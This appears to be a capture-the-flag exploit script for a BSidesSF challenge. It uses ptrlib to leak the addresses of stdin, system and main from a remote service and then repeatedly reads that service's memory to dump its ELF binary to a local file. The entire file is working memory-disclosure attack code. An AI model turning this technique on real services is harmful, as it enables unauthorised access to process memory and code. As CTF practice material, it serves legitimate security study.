from ptrlib import *
import re
import os

sock = Socket("dribbles-c4d3cee3.challenges.bsidessf.net", 9999)

symbols = ["stdin", "system", "main"]
addr_symbols = []

# leak three
for symbol in symbols:
    sock.recvuntil("symbol>")
    sock.sendline(symbol)
    l = sock.recvline()
    r = re.findall(b"\(buf@0x([0-9a-f]+)\) = 0x([0-9a-f]+)", l)
    if not r:
        print(l)
        exit(1)
    addr_buf = int(r[0][0], 16)
    addr_symbols.append(int(r[0][1], 16))

dump("&buf = " + hex(addr_buf))
for symbol, addr_symbol in zip(symbols, addr_symbols):
    dump("&{0} = {1}".format(symbol, hex(addr_symbol)))

elf = b''
buf = b''
proc_base = addr_symbols[2] & 0xfffffffffffff000 - 0x1000
read_byte = 16
sock.recvuntil("read>")
sock.sendline(str(proc_base) + " " + str(read_byte))
l = sock.recvline()
r = re.findall(b"([0-9a-f]{2}) ", l)
elf = b''.fromhex(bytes2str(b''.join(r)))
assert elf[:4] == b'\x7fELF'

if os.path.exists("./elf2"):
    known = os.path.getsize("./elf2")
    elf = b''
else:
    known = 0
proc_base += known - 8

bs = 20
proc_base += 8
read_byte = 16 * bs
end = False
while not end:
    dump("Dumping {}...".format(hex(proc_base)))
    sock.recvuntil("read>")
    sock.sendline(str(proc_base) + " " + str(read_byte))
    for i in range(bs):
        try:
            l = sock.recvline()
        except:
            end = True
            break
        r = re.findall(b"([0-9a-f]{2}) ", l)
        if not r:
            print(l)
            end = True
            break
        for i in range(len(r)):
            if len(r[i]) != 2:
                r[i] = r[-2:]
        elf += b''.fromhex(bytes2str(b''.join(r)))
    proc_base += read_byte

with open("elf2", "ab") as f:
    f.write(elf)

sock.close()
